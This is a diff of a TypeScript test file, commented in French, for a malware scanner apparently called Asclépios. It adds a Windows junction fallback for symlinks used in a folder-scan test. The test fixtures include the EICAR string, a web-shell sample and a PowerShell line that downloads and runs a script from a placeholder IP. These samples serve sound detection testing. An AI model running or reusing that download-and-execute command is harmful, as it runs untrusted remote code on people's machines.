@@ -400,6 +400,8 @@ function world(o: { keys?: boolean } = {}): World {
   return { v, home, sent, fetched, ran, routes, end: () => { unwire(); v.stop(); for (const [k, val] of Object.entries(saved)) { if (val === undefined) delete process.env[k]; else process.env[k] = val; } rmSync(home, { recursive: true, force: true }); } };
 }
 const act = (w: World, action: string, input: Record<string, unknown> = {}) => w.v.act('ullr', action, input);
+/** Un lien vers un dossier. Windows sans droits refuse les liens symboliques (EPERM) mais accepte une jonction, qui y mène tout autant. */
+const lienDossier = (cible: string, chemin: string) => { try { symlinkSync(cible, chemin); } catch (e) { if ((e as NodeJS.ErrnoException).code !== 'EPERM') throw e; symlinkSync(cible, chemin, 'junction'); } };
 
 test('Asclépios · analyse d\'un dossier : rapport horodaté, menace sûre mise en quarantaine (annulable), soupçon laissé à ta décision, EICAR laissé en place', async () => {
   const w = world();
@@ -407,10 +409,11 @@ test('Asclépios · analyse d\'un dossier : rapport horodaté, menace sûre mise
     const d = join(w.home, 'workspace', 'inbox'); mkdirSync(join(d, 'sous'), { recursive: true }); mkdirSync(join(d, 'exclu'), { recursive: true });
     writeFileSync(join(d, 'note.txt'), 'Bonjour'); writeFileSync(join(d, 'eicar.com'), EICAR); writeFileSync(join(d, 'sous', 'shell.php'), WEBSHELL);
     writeFileSync(join(d, 'maj.ps1'), 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'); writeFileSync(join(d, 'exclu', 'autre.php'), WEBSHELL);
-    writeFileSync(join(d, 'vide.txt'), ''); symlinkSync(d, join(d, 'boucle'));
+    // Une boucle de dossiers. Windows sans droits refuse les liens symboliques (EPERM) mais accepte une jonction, qui boucle tout autant.
+    writeFileSync(join(d, 'vide.txt'), ''); lienDossier(d, join(d, 'boucle'));
     assert.deepEqual([...walk(d)].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'exclu/autre.php', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'les liens symboliques ne sont pas suivis (pas de boucle)');
     // Un dossier donné par un lien (ou un dossier temporaire lié, comme sur macOS) : les exclusions tiennent quand même.
-    const lien = join(w.home, 'lien-inbox'); symlinkSync(d, lien);
+    const lien = join(w.home, 'lien-inbox'); lienDossier(d, lien);
     assert.deepEqual([...walk(lien, [join(lien, 'exclu')])].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'exclusion donnée par le chemin du lien');
     const r = await act(w, 'analyser', { dossier: d, exclusions: join(d, 'exclu') });
     assert.equal(r.ok, true); assert.match(r.text, /5 fichiers analysés[\s\S]*3 détection\(s\)/);
